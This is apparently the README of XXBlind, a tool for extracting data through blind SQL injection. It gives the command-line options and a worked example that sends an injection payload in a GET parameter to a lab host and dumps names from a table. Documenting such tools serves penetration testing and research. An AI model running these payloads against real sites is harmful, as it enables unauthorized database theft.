XXBlind
=======

XXBlind, eXtremely fast data eXtraction via blind SQL injection.

The tool can perform attacks against local databases or vulnerable remote
sites. It implements different methods for data extraction, i.e.,
brute-forcing, binary search, probabilistic binary search weighted on single
letters, probabilistic binary search weighted on bigrams and dictionary based
search. By using multi-threading, xxblind supports fast searches for increased
efficiency.

### Requirements

* Python 2.7 or greater (Python 3.X supported)

### Usage

	usage: xxblind [-h] [-U] [-i] [-c COOKIE] [-y SUCCESS] [-s SAMPLE]
	               [-d DICTIONARY] [-O {0,1,2,3,4}] [-q QUERY] [-Q QROWLEN]
	               [-R QROWNUM] [-S QSEPS] [-W QWORDS] [-F FILTER] [-e SEPARATORS]
	               -t TABLE -f FIELDS [-T THREADS] [-v] [-u URL]
	               [-g [GET [GET ...]]] [-p [POST [POST ...]]] [-l LOCALDB]
	
	Optimizated data retrieval via blind SQLi
	
	optional arguments:
	  -h, --help            show this help message and exit
	  -U, --upper           if specified, parse the uppercase version of sample
	                        file
	  -i, --quiet           turn off output
	  -c COOKIE, --cookie COOKIE
	                        pass the data as a cookie
	  -y SUCCESS, --success SUCCESS
	                        look for this string in the HTML page in case of SQLi
	                        success
	  -s SAMPLE, --sample SAMPLE
	                        specify a sample text to parse for collecting
	                        statistical informations
	  -d DICTIONARY, --dictionary DICTIONARY
	                        specify a dictionary file to fill missing words in the
	                        sample file
	  -O {0,1,2,3,4}, --optimize {0,1,2,3,4}
	                        perform an optimized binary search. Use 0 for no
	                        optimization (linear search), 1 for binary search, 2
	                        for binary search using letters frequency, 3 for
	                        binary search using digrams frequency and 4 for
	                        dictionary search
	  -q QUERY, --query QUERY
	                        specify a query for character extraction
	  -Q QROWLEN, --qrowlen QROWLEN
	                        specify a query for extracting row length
	  -R QROWNUM, --qrownum QROWNUM
	                        specify a query for extracting the number of rows
	  -S QSEPS, --qseps QSEPS
	                        specify a query for extracting the position of
	                        separators in each row
	  -W QWORDS, --qwords QWORDS
	                        specify a query for words extraction
	  -F FILTER, --filter FILTER
	                        specify one or more conditions in every query
	  -e SEPARATORS, --separators SEPARATORS
	                        specify the separators
	  -t TABLE, --table TABLE
	                        specify a table
	  -f FIELDS, --fields FIELDS
	                        specify one or more fields to dump
	  -T THREADS, --threads THREADS
	                        specify the maximum number of concurrent threads
	  -v, --version         show program's version number and exit
	  -u URL, --url URL     target url
	  -g [GET [GET ...]], --get [GET [GET ...]]
	                        define a list of GET variables
	  -p [POST [POST ...]], --post [POST [POST ...]]
	                        define a list of POST variables
	  -l LOCALDB, --localdb LOCALDB
	                        target db for simulation purposes. Pass parameters for
	                        connecting in the form of host:user:pwd:dbname

### Examples

A typical invocation of the tool consists in specifying the vulnerable page, a
list of GET or POST parameters, the string to look for when the SQLi succeeds,
the field of the table to be extracted and the table name, the type of attack,
a text for sampling words and computing frequency analysis and the number of
threads.

The following command dumps the name field of the table person by performing a
dictionary based search using 3 parallel threads:

	xxblind -u "http://192.168.56.101/vulnerable.php" \
	        -g "name=’ OR %%%QUERY%%% #" -y "found" \
	        -f name -t person -O4 \
	        -s samples/names_it.txt -T3
	[*] Performing dictionary search
	[*] Getting separator positions
	[*] Extracted data
	--------------------------------
	flaminia
	riccardo
	marco
	--------------------------------
	Total time (s): 1.18442893028
	Parallel threads: 3
	Total queries: 59, Total chars: 21
	Queries/Chars ratio: 2.80952380952

